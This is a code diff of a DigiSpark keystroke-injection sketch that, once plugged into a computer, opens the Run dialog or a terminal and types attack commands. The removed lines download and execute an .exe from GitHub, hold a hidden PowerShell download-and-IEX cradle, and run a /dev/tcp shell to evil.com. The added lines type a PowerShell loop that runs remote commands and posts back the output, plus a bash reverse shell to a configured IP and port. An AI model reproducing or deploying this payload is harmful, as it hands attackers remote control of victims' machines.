@@ -4,7 +4,10 @@ Code to be run on DigiSpark compatible boards
 
 #include <avr/wdt.h>
 #include "DigiKeyboard.h"
-#define ITA
+
+// define server IP and port
+#define IP 0.0.0.0
+#define PORT 80
 
 static int run;
 
@@ -26,48 +29,27 @@ void loop()
 {
   wdt_reset();
 
-  if (win_os())
+  if (win_os())  // running on a Windows machine
   {
     DigiKeyboard.update();
     DigiKeyboard.sendKeyStroke(0);
     DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
     DigiKeyboard.delay(500);
-    /*
-      DigiKeyboard.println("cmd");
-      DigiKeyboard.delay(500);
-      DigiKeyboard.sendKeyStroke(KEY_ENTER);
-      DigiKeyboard.delay(500);
-    */
     wdt_reset();
-    DigiKeyboard.println("PowerShell (New-Object System.Net.WebClient).DownloadFile('https://github.com/grcasanova/Grapher/raw/master/func.exe','mess.exe');Start-Process 'mess.exe'");
-    /*
-      #ifdef ITA
-      DigiKeyboard.println("powershell.exe /nop /w hidden /c $)new/object net.webclient<$c.proxy)[Net.WebRequest]>>GetSystemWebProxy*(<$c.Proxy.Credentials)[Net.CredentialsCache]>>DefaultCredentials<IEX $c.downloadstring*-http>&&192.168.1.121>8080&exploit-(<");
-      #else
-      DigiKeyboard.println("powershell.exe -nop -w hidden -c $c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $c.downloadstring('http://192.168.1.121:8080/exploit');");
-      #endif
-    */
+    DigiKeyboard.println("PowerShell $u='"IP":"PORT"';while(1){irm $u -m post -b(iex(irm $u).c)}");
     DigiKeyboard.delay(800);
-    DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    DigiKeyboard.delay(800);
-    DigiKeyboard.println("exit");
-    DigiKeyboard.delay(500);
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(500);
     wdt_reset();
   }
-  else
+  else  // running on a Unix machine
   {
     DigiKeyboard.update();
     DigiKeyboard.sendKeyStroke(0);
     DigiKeyboard.sendKeyStroke(KEY_N, MOD_GUI_LEFT);
     DigiKeyboard.delay(500);
-    DigiKeyboard.println("exec 5<>/dev/tcp/evil.com/8080");
-    DigiKeyboard.delay(800);
-    DigiKeyboard.sendKeyStroke(KEY_ENTER);
     wdt_reset();
-    DigiKeyboard.delay(800);
-    DigiKeyboard.println("cat <&5 | while read line; do $line 2>&5 >&5; done");
+    DigiKeyboard.println("/bin/bash -i >& /dev/tcp/"IP"/"PORT" 0>&1");
     DigiKeyboard.delay(800);
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(500);
